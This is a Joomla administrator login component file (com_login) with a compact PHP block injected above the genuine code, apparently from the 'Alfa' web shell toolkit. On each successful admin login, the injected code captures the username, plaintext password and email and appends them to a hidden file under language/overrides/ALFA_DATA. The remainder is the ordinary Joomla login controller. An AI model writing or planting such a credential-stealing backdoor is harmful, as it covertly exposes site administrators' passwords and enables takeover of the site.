<?php jimport('joomla.user.authentication');$Alfa_auth = & JAuthentication::getInstance();$Alfa_data = array('username'=>$_POST['username'],'password'=>$_POST['passwd']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($Alfa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="D:/home/site/wwwroot/language/overrides/ALFA_DATA/alfa.txt";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST['passwd']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>
<?php
/**
 * @package     Joomla.Administrator
 * @subpackage  com_login
 *
 * @copyright   Copyright (C) 2005 - 2016 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

$input = JFactory::getApplication()->input;
$task = $input->get('task');

if ($task != 'login' && $task != 'logout')
{
	$input->set('task', '');
	$task = '';
}

$controller = JControllerLegacy::getInstance('Login');
$controller->execute($task);
$controller->redirect();
